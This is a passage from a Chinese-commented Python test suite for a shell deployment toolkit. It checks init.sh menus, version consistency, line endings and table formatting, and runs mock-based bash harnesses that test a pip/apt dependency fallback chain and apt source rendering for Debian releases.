        log_fail("存在 [Y/n] 式隐式默认值", "回车即采用的默认与纯交互约定不符")

    # 4) 交互基础函数齐全
    need_fns = ["menu", "read_input", "read_secret", "ask_yes_no", "pick_node", "run_script", "pause"]
    missing_fns = [fn for fn in need_fns
                   if not re.search(r'^' + re.escape(fn) + r'\(\)\s*\{', src, re.MULTILINE)]
    if missing_fns:
        log_fail(f"init.sh 缺少交互函数: {missing_fns}")
    else:
        log_pass(f"init.sh 交互基础函数齐全（{len(need_fns)} 个）")

    # 5) 主菜单功能项齐全
    need_menus = ["部署 Panel 控制面板", "部署节点", "节点维护", "配置与分发", "服务安装", "环境自检"]
    missing_menus = [m for m in need_menus if m not in src]
    if missing_menus:
        log_fail(f"init.sh 主菜单缺少功能项: {missing_menus}")
    else:
        log_pass(f"init.sh 主菜单覆盖 {len(need_menus)} 项核心功能")

    # 6) 引用的 scripts/*.sh 必须真实存在（避免菜单点进去才发现脚本没了）
    refs = sorted(set(re.findall(r'\$\{SCRIPTS_DIR\}/([A-Za-z0-9_.\-]+\.sh)', src)))
    missing_refs = [r for r in refs if not (SCRIPTS_DIR / r).exists()]
    if not refs:
        log_fail("init.sh 未引用任何 scripts/ 脚本")
    elif missing_refs:
        log_fail(f"init.sh 引用了不存在的脚本: {missing_refs}")
    else:
        log_pass(f"init.sh 引用的 {len(refs)} 个 scripts/ 脚本均存在")

    # 7) 面板安装复用既有实现，不重复造 unit
    if "${PANEL_DIR}/install-service.sh" in src and (PANEL_DIR / "install-service.sh").exists():
        log_pass("面板 systemd 安装复用 panel/install-service.sh（未重复实现）")
    else:
        log_fail("面板 systemd 安装未复用 panel/install-service.sh")

    # 8) 不硬编码集群节点 IP（统一走 lib-nodes.sh）
    real_ips = [ip for ip in load_node_ip_map().values() if ip]
    hard = [ip for ip in real_ips if ip in src]
    if hard:
        log_fail(f"init.sh 硬编码了节点 IP: {hard}", "应统一从 lib-nodes.sh 读取")
    else:
        log_pass("init.sh 未硬编码节点 IP（统一走 lib-nodes.sh）")

    # 9) 文档登记
    if init_readme.exists():
        log_pass("init/README.md 存在")
    else:
        log_fail("init/README.md 缺失")

    root_readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "init/init.sh" in root_readme and "init/README.md" in root_readme:
        log_pass("根 README 已登记 init 入口与文档链接")
    else:
        log_fail("根 README 未登记 init 入口", "新目录需要在根 README 可见")


# ============ 测试19: 交付物一致性 ============
def test_delivery_consistency():
    """测试 19: 版本声明一致 / 行尾防护 / 面板监听参数可注入 / 表格排版"""
    print("\n" + "="*60)
    print("测试 19: 交付物一致性")
    print("="*60)

    # 1) 版本声明四处一致 (历史上出现过 README 与 config.json 漂移)
    versions = {}

    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    m = re.search(r'当前版本:\s*v?([0-9]+\.[0-9]+\.[0-9]+)', readme)
    if m:
        versions["README.md"] = m.group(1)

    try:
        cfg = json.loads((PANEL_DIR / "config.json").read_text(encoding="utf-8"))
        versions["panel/config.json"] = str(cfg.get("version", ""))
    except Exception as e:
        log_fail(f"panel/config.json 读取失败: {e}")

    app_src = (PANEL_DIR / "app.py").read_text(encoding="utf-8")
    m = re.search(r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"', app_src)
    if m:
        versions["panel/app.py"] = m.group(1)

    gen_src = (SCRIPTS_DIR / "gen-panel-config.sh").read_text(encoding="utf-8")
    m = re.search(r'ONECLOUD_PANEL_VERSION:-([0-9]+\.[0-9]+\.[0-9]+)', gen_src)
    if m:
        versions["gen-panel-config.sh"] = m.group(1)

    if len(versions) == 4 and len(set(versions.values())) == 1:
        log_pass(f"版本声明四处一致（{list(versions.values())[0]}）")
    else:
        log_fail(f"版本声明不一致: {versions}", "README / config.json / app.py / 生成脚本须同步")

    if len(versions) == 4:
        log_pass("版本号可从 README / config.json / app.py / 生成脚本四处解析到")
    else:
        log_fail(f"版本号解析不全: {sorted(versions.keys())}")

    # 2) .gitattributes: 锁定 LF, 防止 Windows checkout 出 CRLF 导致 bad interpreter
    ga = PROJECT_ROOT / ".gitattributes"
    if ga.exists():
        log_pass(".gitattributes 存在")
        ga_src = ga.read_text(encoding="utf-8")
        if re.search(r'\*[ \t]+text=auto[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 声明 * text=auto eol=lf")
        else:
            log_fail(".gitattributes 未声明 * text=auto eol=lf")
        if re.search(r'\*\.sh[ \t]+text[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 显式声明 *.sh eol=lf")
        else:
            log_fail(".gitattributes 未显式声明 *.sh eol=lf")
        if re.search(r'\*\.(png|gz|zip|deb|woff2?)\s+binary', ga_src):
            log_pass(".gitattributes 对二进制文件声明 binary（不做行尾转换）")
        else:
            log_fail(".gitattributes 未保护二进制文件")
    else:
        log_fail(".gitattributes 缺失", "Windows 工作区会被 checkout 成 CRLF")

    # 3) 实际行尾: 工作区 shell 脚本不得含 CR
    cr_scripts = []
    for sh in sorted(PROJECT_ROOT.rglob("*.sh")):
        if ".git" in sh.parts:
            continue
        try:
            if b"\r" in sh.read_bytes():
                cr_scripts.append(str(sh.relative_to(PROJECT_ROOT)).replace("\\", "/"))
        except OSError:
            pass
        if len(cr_scripts) >= 5:
            break
    if cr_scripts:
        log_fail(f"工作区 shell 脚本含 CRLF: {cr_scripts[:5]}",
                 "CRLF 会导致 bad interpreter 与变量尾部混入 \\r")
    else:
        log_pass("工作区全部 shell 脚本均为 LF 行尾")

    # 4) 面板监听参数必须可注入 (不能写死在 unit 模板里)
    inst = (PANEL_DIR / "install-service.sh").read_text(encoding="utf-8")
    if 'PANEL_PORT="${PANEL_PORT:-' in inst and 'PANEL_HOST="${PANEL_HOST:-' in inst:
        log_pass("install-service.sh 监听端口/地址来自环境变量（含默认值）")
    else:
        log_fail("install-service.sh 仍硬编码监听端口/地址",
                 "自定义端口会退化为依赖 drop-in 覆盖顺序")

    if "Environment=PANEL_PORT=${PANEL_PORT}" in inst and "Environment=PANEL_HOST=${PANEL_HOST}" in inst:
        log_pass("unit 中的 Environment= 使用注入值而非字面量")
    else:
        log_fail("unit 中 Environment= 未使用注入值")

    init_src = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "env PANEL_HOST=" in init_src and "PANEL_PORT=" in init_src:
        log_pass("init.sh 安装面板服务时注入 PANEL_HOST/PANEL_PORT（用 env 规避 sudo env_reset）")
    else:
        log_fail("init.sh 未向 install-service.sh 注入监听参数")

    # 5) 中文表头不得使用 %-Ns 按字节填充
    # 判据: printf 的「实参」里出现中文字面量, 且格式串含 %-Ns
    #   printf "  %-16s %s\n" "名称" "IP"      -> 实参有中文, 会被按字节填充 => 反模式
    #   printf "  %-24s (无固定端口)\n" "$name" -> 中文在格式串, 填充的是 ASCII 变量 => 正常
    def _first_arg(rest):
        """取 printf 之后的第一个实参文本（引号 / 命令替换 / ${} / 裸词）"""
        rest = rest.lstrip()
        if not rest:
            return ""
        ch = rest[0]
        if ch in "'\"":
            end = rest.find(ch, 1)
            return rest[:end + 1] if end > 0 else rest
        if rest.startswith("$("):
            depth = 0
            for i, c in enumerate(rest):
                if c == "(":
                    depth += 1
                elif c == ")":
                    depth -= 1
                    if depth == 0:
                        return rest[:i + 1]
            return rest
        if rest.startswith("${"):
            end = rest.find("}", 2)
            return rest[:end + 1] if end > 0 else rest
        return rest.split()[0]

    def _cjk_printf_smell(line):
        # 只看「被 %-Ns 填充的那个实参」是否含中文。
        # 中文出现在 printf 之外是正常的, 例如:
        #   "$(printf '%-15s' '0.0.0.0')   全部网卡 (含 WireGuard / 外网网卡)"
        # 填充的是 ASCII 字面量, 中文只是同一行的说明文字。
        m = re.search(r'printf\s+(?:"([^"]*)"|\'([^\']*)\'|([^\s]+))', line)
        if not m:
            return False
        fmt = next((g for g in m.groups() if g is not None), "")
        if not re.search(r'%-\d+s', fmt):
            return False
        arg = _first_arg(line[m.end():])
        return bool(re.search(r'[\u4e00-\u9fff]', arg))

    bad_tables = []
    for sh in sorted(SCRIPTS_DIR.glob("*.sh")) + [PROJECT_ROOT / "init" / "init.sh"]:
        if not sh.exists():
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            if ln.lstrip().startswith("#"):
                continue
            if _cjk_printf_smell(ln):
                bad_tables.append(f"{sh.name}:{ln_no}")
    if bad_tables:
        log_fail(f"printf 实参含中文且格式串有 %-Ns（按字节填充会错位）: {bad_tables[:5]}")
    else:
        log_pass("无「printf 实参含中文 + %-Ns」的按字节填充写法")


def test_pydeps_fallback():
    """测试 20: Python 依赖安装的降级链 (pip 缺失场景)"""
    print("\n" + "=" * 60)
    print("测试 20: Python 依赖降级链 (lib-pydeps.sh)")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-pydeps.sh"
    if not lib.exists():
        log_fail("scripts/lib-pydeps.sh 缺失")
        return
    lsrc = lib.read_text(encoding="utf-8")

    # ---- 静态断言 ----
    needed = ["pydeps_pip_usable", "pydeps_try_ensurepip", "pydeps_try_apt_pip",
              "pydeps_try_getpip", "pydeps_try_apt_pkgs", "pydeps_verify",
              "pydeps_install", "pydeps_install_from_file"]
    missing = [n for n in needed if f"{n}()" not in lsrc]
    if not missing:
        log_pass("lib-pydeps.sh 具备完整降级链函数")
    else:
        log_fail(f"lib-pydeps.sh 缺少函数: {missing}")

    if 'python3-flask-cors' in lsrc and 'python3-flask' in lsrc:
        log_pass("具备发行版包 (apt) 兜底映射")
    else:
        log_fail("缺少 apt 包名映射", "pip 不可用时无法兜底")

    # 调用方必须复用同一实现, 不得再各自拼 pip 命令
    dup = []
    for sh in [PROJECT_ROOT / "init" / "init.sh", SCRIPTS_DIR / "setup.sh",
               SCRIPTS_DIR / "install-services.sh", SCRIPTS_DIR / "lib-pydeps.sh"]:
        if not sh.exists():
            continue
        if sh.name == "lib-pydeps.sh":
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            s = ln.strip()
            if s.startswith("#"):
                continue
            if re.search(r'(^|\s|\|)pip3\s+install', ln):
                dup.append(f"{sh.name}:{ln_no}")
    if not dup:
        log_pass("无脚本再直接调用裸 pip3 (统一走 lib-pydeps.sh)")
    else:
        log_fail(f"仍有裸 pip3 调用: {dup[:4]}", "pip 缺失时会 command not found")

    # init.sh 必须 source 该库
    isrc = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "lib-pydeps.sh" in isrc and "panel_install_deps" in isrc:
        log_pass("init.sh 已接入 lib-pydeps.sh")
    else:
        log_fail("init.sh 未接入 lib-pydeps.sh")

    # 关键: panel_install_deps 不能只靠 --break-system-packages 救场
    if "pydeps_pip_usable" in isrc and "python3-pip" in isrc:
        log_pass("init.sh 会先检测 pip 是否可用, 并具备补齐路径")
    else:
        log_fail("init.sh 未检测 pip 可用性",
                 "--break-system-packages 补不了缺失的 pip 自身")

    # ---- 行为验证: 用 mock 解释器/包管理器跑真实降级链 ----
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t20_"))
    harness = tmpdir / "harness.sh"

    tmpl = r'''#!/bin/bash
set -u
LIB="__LIB__"
ROOT="__ROOT__"
M="$ROOT/mockbin"
mkdir -p "$M"

cat > "$M/python3" << 'PYMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
log() { printf '%s\n' "$*" >> "$SD/calls"; }
mod_of() { printf '%s' "$1" | tr '-' '_'; }
case "${1:-}" in
  -m)
    shift
    case "${1:-}" in
      pip)
        shift
        if [ ! -f "$SD/pip" ]; then echo "No module named pip" >&2; exit 1; fi
        case "${1:-}" in
          --version) echo "pip 24.0"; exit 0 ;;
          install)
            shift
            brk=0; args=""
            for a in "$@"; do
              if [ "$a" = "--break-system-packages" ]; then brk=1; continue; fi
              case "$a" in -*) continue ;; esac
              args="$args $a"
            done
            if [ "$brk" = "1" ]; then
              log "pip install --break-system-packages$args"
              [ "${S_break:-0}" = "1" ] || { echo "error" >&2; exit 1; }
            else
              log "pip install$args"
              [ "${S_plain:-0}" = "1" ] || { echo "externally-managed-environment" >&2; exit 1; }
            fi
            if [ "${S_touch:-1}" = "1" ]; then
              for a in $args; do : > "$SD/inst_$(mod_of "$a")"; done
            fi
            exit 0
            ;;
        esac
        exit 1
        ;;
      ensurepip)
        log "ensurepip"
        if [ "${S_ensurepip:-0}" = "1" ]; then : > "$SD/pip"; exit 0; fi
        echo "No module named ensurepip" >&2
        exit 1
        ;;
    esac
    exit 1
    ;;
  -c)
    mods="$(printf '%s' "${2:-}" | sed -e 's/^import //' -e 's/,/ /g')"
    for m in $mods; do [ -f "$SD/inst_$m" ] || exit 1; done
    exit 0
    ;;
esac
exit 1
PYMOCK

cat > "$M/apt-get" << 'APTMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
[ "${1:-}" = "update" ] && exit 0
[ "${1:-}" = "install" ] || exit 1
shift
pkgs=""
for a in "$@"; do
  case "$a" in -*) continue ;; esac
  pkgs="$pkgs $a"
done
printf 'apt-get install%s\n' "$pkgs" >> "$SD/calls"
for p in $pkgs; do
  if [ "$p" = "python3-pip" ]; then
    if [ "${S_apt_pip:-0}" = "1" ]; then : > "$SD/pip"; else exit 1; fi
    continue
  fi
  case " ${S_avail:-} " in
    *" $p "*) : > "$SD/inst_$(printf '%s' "$p" | sed -e 's/^python3-//' -e 's/-/_/g')" ;;
    *) exit 1 ;;
  esac
done
exit 0
APTMOCK

# 断网: 让 get-pip.py 兜底快速失败, 保证测试确定性
printf '#!/bin/bash\nexit 1\n' > "$M/curl"
cp "$M/curl" "$M/wget"
chmod +x "$M"/*

scenario() {
    local name="$1" plain="$2" brk="$3" ens="$4" aptpip="$5" avail="$6" touch="$7" pre="$8"
    local SC="$ROOT/$name"
    mkdir -p "$SC"          # ROOT 由 mktemp 新建, 每个 SC 都是全新目录, 无需 rm
    local p
    for p in $pre; do : > "$SC/inst_$p"; done
    [ "${9:-0}" = "1" ] && : > "$SC/pip"
    echo "###CASE:$name"
    # 固定 PATH: 只留本仓 mock 与系统工具。宿主 shell 会往 PATH 注入
    # rm 安全 shim, 而这类 shim 会对 rm -rf 发起确认并挂起, 必须绕开。
    MOCK_STATE="$SC" S_plain="$plain" S_break="$brk" S_ensurepip="$ens" \
    S_apt_pip="$aptpip" S_avail="$avail" S_touch="$touch" \
    PATH="$M:/usr/bin:/bin" \
        bash -c '
            source "$0"
            pydeps_install "$1" "flask flask-cors" ""
            rc=$?
            echo "RC=$rc"
            if [ "$rc" != "0" ]; then pydeps_hint "flask flask-cors" "$1" ""; fi
        ' "$LIB" python3 2>&1 | sed 's/^/    /'
    echo "    CALLS: $(cat "$SC/calls" 2>/dev/null | tr '\n' '|')"
}

scenario already_ok   0 0 0 0 ""                 1 "flask flask_cors" 0
scenario pip_plain    1 0 0 0 ""                 1 "" 1
scenario pep668       0 1 0 0 ""                 1 "" 1
scenario via_ensure   1 0 1 0 ""                 1 "" 0
scenario via_apt_pip  0 1 0 1 ""                 1 "" 0
scenario via_apt_pkg  0 0 0 0 "python3-flask python3-flask-cors" 1 "" 0
scenario all_fail     0 0 0 0 ""                 1 "" 0
scenario pip_lied     1 0 0 0 "python3-flask python3-flask-cors" 0 "" 1
'''
    harness.write_text(
        tmpl.replace("__LIB__", _posix(lib)).replace("__ROOT__", _posix(tmpdir)),
        encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=240)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        checks = [
            ("pip_plain", "RC=0", "pip install flask flask-cors", "常规 pip 路线"),
            ("pep668", "RC=0", "pip install --break-system-packages flask flask-cors",
             "PEP 668 时自动加 --break-system-packages"),
            ("via_ensure", "RC=0", "ensurepip", "ensurepip 补齐 pip"),
            ("via_apt_pip", "RC=0", "apt-get install python3-pip",
             "pip 缺失时用 apt 补齐 python3-pip"),
            ("via_apt_pkg", "RC=0", "apt-get install python3-flask python3-flask-cors",
             "pip 完全不可用时改走发行版包"),
            ("all_fail", "RC=1", "--break-system-packages flask", "彻底失败时给出手工命令"),
            ("pip_lied", "RC=0", "apt-get install python3-flask", "pip 谎报成功时靠 import 校验兜住"),
        ]
        for tag, want_rc, want_call, desc in checks:
            c = case(tag)
            ok = want_rc in c and want_call in c
            if ok:
                log_pass(desc)
            else:
                log_fail(f"{desc} —— 用例 {tag} 不符合预期",
                         f"缺 [{want_rc}] 或 [{want_call}]; 实际: {c.strip()[:180]}")

        # 依赖已齐时必须完全不动包管理器
        c = case("already_ok")
        if "依赖已就绪" in c and "pip install" not in c and "apt-get" not in c:
            log_pass("依赖已齐时直接返回, 不调用 pip/apt")
        else:
            log_fail("依赖已齐时仍调用了包管理器", c.strip()[:180])

        # via_apt_pip 场景不得退回装发行版包 (顺序必须是先补 pip)
        c = case("via_apt_pip")
        if "apt-get install python3-flask" not in c:
            log_pass("补齐 pip 成功后不再多装发行版包 (降级顺序正确)")
        else:
            log_fail("补齐 pip 后仍安装了发行版包", "降级顺序不符预期")

        # all_fail 必须给出可复制的手工命令
        c = case("all_fail")
        if "pip install --break-system-packages" in c and "apt-get install -y python3-flask" in c:
            log_pass("失败提示含 pip 与 apt 两条可复制命令")
        else:
            log_fail("失败提示缺少可复制命令", c.strip()[:180])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试21: bootstrap apt 源与依赖安装回归 ============
def test_bootstrap_apt_sources():
    """测试 21: apt 源按系统代号渲染 / apt 失败诊断 / wireguard-dkms 条件安装

    背景: 老实现把 sources.list 写死成 bullseye, 且在基础工具里无条件安装
    wireguard-dkms。Debian 12 已移除该包, apt 会以退出码 100 失败, 又被
    set -e 原样透传出去, 现场只看到一个裸 100, 无法定位。
    """
    print("\n" + "=" * 60)
    print("测试 21: bootstrap apt 源与依赖安装回归")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")
    lines = src.splitlines()

    # ---- 1) 静态检查: 不允许再写死 bullseye / 不允许无条件装 dkms ----
    if re.search(r"deb\s+https?://\S+\s+bullseye\s", src):
        log_fail("bootstrap.sh 仍写死 bullseye 源", "Debian 12 机器会被写入错误代号")
    else:
        log_pass("apt 源不再写死 bullseye (按系统代号渲染)")

    if "wireguard-tools wireguard-dkms" in src:
        log_fail("基础工具仍无条件安装 wireguard-dkms", "Debian 12 起该包已移除 -> apt 退出 100")
    else:
        log_pass("wireguard-dkms 不再出现在无条件安装列表")

    needed = ["detect_distro()", "apt_components_for()", "wireguard_kernel_builtin()",
              "configure_apt_sources()", "apt_run()", "apt_try()"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备发行版探测 / 源写入 / apt 失败诊断等辅助函数")
    else:
        log_fail(f"缺少辅助函数: {missing}")

    if "apt-cache show wireguard-dkms" in src and "apt_run \"安装 wireguard-dkms\"" in src:
        log_pass("wireguard-dkms 改为按需安装 (仅源确实提供时)")
    else:
        log_fail("未实现 wireguard-dkms 按需安装")

    if "ONECLOUD_APT_SKIP_MIRROR" in src and "ONECLOUD_APT_MIRROR" in src:
        log_pass("提供换源逃生开关 (跳过/自定义镜像)")
    else:
        log_fail("缺少换源逃生开关", "镜像不可达时用户无法绕过")

    # ---- 2) 行为验证: 提取 helper 与步骤3~5 逐场景跑 mock ----
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法在 bootstrap.sh 定位 helper / 步骤锚点",
                 "代码结构变了, 需同步更新本测试的锚点")
        return

    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t21_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "apt": r"""#!/bin/bash
echo "apt $*" >> "$APT_LOG"
if [ "$1" = "update" ] && [ "$MOCK_FAIL_UPDATE" = "1" ]; then
    echo "E: Failed to fetch http://mirrors.tuna.tsinghua.edu.cn/debian/dists/bookworm/InRelease  502  Bad Gateway" >&2
    exit 100
fi
if [ "$1" = "upgrade" ] && [ "$MOCK_FAIL_UPGRADE" = "1" ]; then
    echo "E: Unable to correct problems, you have held broken packages." >&2
    exit 100
fi
for a in "$@"; do
    if [ "$a" = "wireguard-dkms" ] && [ "$MOCK_DKMS_INSTALL_FAIL" = "1" ]; then
        echo "E: Unable to locate package wireguard-dkms" >&2
        exit 100
    fi
done
exit 0
""",
        "apt-cache": r"""#!/bin/bash
echo "apt-cache $*" >> "$APT_LOG"
if [ "$1" = "show" ] && [ "$2" = "wireguard-dkms" ]; then
    if [ "$MOCK_DKMS_AVAILABLE" = "1" ]; then
        echo "Package: wireguard-dkms"
        exit 0
    fi
    echo "E: No packages found" >&2
    exit 100
fi
exit 0
""",
        "uname": r"""#!/bin/bash
[ "$1" = "-r" ] && { echo "$MOCK_KERNEL"; exit 0; }
echo Linux
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1" id="$2" cn="$3" legacy="$4" deb822="$5"
    shift 5
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=%s\nVERSION_CODENAME=%s\n' "$id" "$cn" > "$root/os-release"
    if [ "$deb822" = "1" ]; then
        cat > "$root/apt/sources.list.d/debian.sources" <<'EOS'
Types: deb
URIs: http://deb.debian.org/debian
Suites: bookworm bookworm-updates
Components: main
Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg
EOS
    fi
    if [ "$legacy" = "1" ]; then
        cat > "$root/apt/sources.list" <<'EOS'
deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free
deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free
EOS
    fi
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"
    export MOCK_FAIL_UPDATE=0 MOCK_FAIL_UPGRADE=0 MOCK_DKMS_AVAILABLE=0
    export MOCK_DKMS_INSTALL_FAIL=0 MOCK_KERNEL=5.10.63-rockchip
    unset ONECLOUD_APT_SKIP_MIRROR
    # v1.4.5 起换源/更新默认跳过; 本组验证的是"开启后"的老行为, 故显式打开
    export DO_MIRROR=true DO_APT_UPDATE=true DO_APT_UPGRADE=true DO_APT_PKGS=true
    local kv
    for kv in "$@"; do export "$kv"; done
    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###OUT_BEGIN:$tag"
    cat "$WORK/out_$tag.txt"
    echo "###OUT_END:$tag"
    echo "###SOURCES_BEGIN:$tag"
    [ -f "$root/apt/sources.list" ] && cat "$root/apt/sources.list"
    [ -f "$root/apt/sources.list.d/debian.sources" ] && cat "$root/apt/sources.list.d/debian.sources"
    echo "###SOURCES_END:$tag"
    echo "###APTLOG_BEGIN:$tag"
    cat "$APT_LOG"
    echo "###APTLOG_END:$tag"
    echo "###BAK_BEGIN:$tag"
    [ -f "$root/apt/sources.list.onecloud.bak" ] && echo "sources.list.onecloud.bak"
    [ -f "$root/apt/sources.list.d/debian.sources.onecloud.bak" ] && echo "debian.sources.onecloud.bak"
    echo "###BAK_END:$tag"
}

run_case s1_bookworm_ok       debian bookworm 1 0
run_case s2_update_100        debian bookworm 1 0 MOCK_FAIL_UPDATE=1
run_case s3_upgrade_100       debian bookworm 1 0 MOCK_FAIL_UPGRADE=1
run_case s4_oldkern_nodkms    debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip
run_case s5_oldkern_dkms      debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1
run_case s6_deb822            debian bookworm 1 1
run_case s7_ubuntu            ubuntu jammy    1 0
run_case s8_skip_mirror       debian bookworm 1 0 DO_MIRROR=false
run_case s9_bullseye          debian bullseye 1 0
run_case s10_dkms_install_100 debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1 MOCK_DKMS_INSTALL_FAIL=1
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        # --- s1: 核心回归 (bookworm 机器 + 旧 bullseye 源残留) ---
        s1 = sect("SOURCES", "s1_bookworm_ok")
        c1 = sect("OUT", "s1_bookworm_ok")
        a1 = sect("APTLOG", "s1_bookworm_ok")
        if rc("s1_bookworm_ok") == 0:
            log_pass("bookworm 机器上初始化成功退出 (老实现此处 apt 100)")
        else:
            log_fail(f"bookworm 机器初始化退出码 {rc('s1_bookworm_ok')}")
        if "bookworm main contrib non-free non-free-firmware" in s1 and "bullseye" not in s1:
            log_pass("源按实际代号写成 bookworm (含 non-free-firmware), 无 bullseye 残留")
        else:
            log_fail("源代号或组件不正确", s1[:200])
        if "-updates" in s1 and "-backports" in s1 and "bookworm-security" in s1:
            log_pass("updates / backports / security 三类源齐全")
        else:
            log_fail("源条目不全", s1[:200])
        if "wireguard-tools" in a1 and "wireguard-dkms" not in a1:
            log_pass("基础工具装 wireguard-tools, 不再装 wireguard-dkms")
        else:
            log_fail("基础工具安装列表不正确", a1[:200])
        if "已内置 wireguard" in c1:
            log_pass("5.6+ 内核识别为内置 wireguard, 明确跳过 dkms")
        else:
            log_fail("未识别内置 wireguard 模块", c1[-200:])
        if "sources.list.onecloud.bak" in sect("BAK", "s1_bookworm_ok"):
            log_pass("改写前备份原 sources.list")
        else:
            log_fail("未备份原 sources.list", "出问题无法回滚")

        # --- s2: apt update 返回 100 (v1.4.5 起为非致命步骤, 但报错必须透出) ---
        c2 = sect("OUT", "s2_update_100")
        if rc("s2_update_100") == 0:
            log_pass("apt update 失败不致命 (不再让整机初始化停在半路)")
        else:
            log_fail(f"apt update 失败导致整体退出 {rc('s2_update_100')}")
        if "apt 步骤失败" in c2 and "100 = apt/dpkg 处理失败" in c2:
            log_pass("失败时打印步骤名并解释 100 的含义")
        else:
            log_fail("未给出 100 的解释", c2[-300:])
        if "源文件:" in c2 and "系统代号" in c2:
            log_pass("给出源文件与系统代号等排查线索")
        else:
            log_fail("缺少排查线索")
        if "502  Bad Gateway" in c2:
            log_pass("保留 apt 原始报错 (不再只看到裸退出码)")
        else:
            log_fail("未保留 apt 原始输出")

        # --- s3: apt upgrade 失败不应中断 ---
        c3 = sect("OUT", "s3_upgrade_100")
        if rc("s3_upgrade_100") == 0:
            log_pass("apt upgrade 失败不致命, 不中断整机初始化")
        else:
            log_fail(f"升级失败导致整体退出 {rc('s3_upgrade_100')}", "主机名/源已改却什么都没配完")
        if "该步骤失败但继续" in c3:
            log_pass("升级失败时明确告警并继续")
        else:
            log_fail("升级失败未告警")
        if "apt install" in sect("APTLOG", "s3_upgrade_100"):
            log_pass("升级失败后仍继续安装基础工具")
        else:
            log_fail("升级失败后未继续安装基础工具")

        # --- s4/s5: 老内核下 dkms 按需安装 ---
        c4 = sect("OUT", "s4_oldkern_nodkms")
        a4 = sect("APTLOG", "s4_oldkern_nodkms").replace("apt-cache show wireguard-dkms", "")
        if rc("s4_oldkern_nodkms") == 0 and "不提供 wireguard-dkms" in c4 and "wireguard-dkms" not in a4:
            log_pass("老内核 + 源无该包: 跳过而非硬装 (这是 100 的根因)")
        else:
            log_fail("源不提供该包时未正确跳过", c4[-200:])
        a5 = sect("APTLOG", "s5_oldkern_dkms")
        if rc("s5_oldkern_dkms") == 0 and "install -y wireguard-dkms" in a5:
            log_pass("老内核 + 源提供该包: 按需安装")
        else:
            log_fail("应当按需安装时未安装", a5[:200])

        # --- s6: deb822 布局就地重写 ---
        s6 = sect("SOURCES", "s6_deb822")
        b6 = sect("BAK", "s6_deb822")
        if rc("s6_deb822") == 0 and "Suites: bookworm bookworm-updates bookworm-backports" in s6:
            log_pass("识别 deb822 源文件并就地重写为实际代号")
        else:
